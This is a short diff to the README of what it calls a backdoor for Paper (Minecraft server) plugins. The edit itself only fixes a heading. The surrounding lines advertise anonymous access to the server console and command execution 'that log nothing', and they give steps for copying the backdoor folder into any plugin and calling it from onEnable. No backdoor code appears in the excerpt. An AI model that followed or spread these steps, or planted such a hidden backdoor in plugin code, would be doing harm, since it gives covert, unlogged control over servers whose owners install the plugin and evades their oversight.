@@ -2,7 +2,7 @@
 
 * Put this in any paper plugin to gain anonymous access to CONSOLE or execute custom build in command that log nothing!
 
-#How-to
+# How-to
 * 1: Copy the folder ```src/main/java/org/brandonplank/backdoor``` into your plugin
 * 2: Import BookBackdoor.java into your main class
 * 3: Add this code to the ```onEnable(){}``` method in your main class
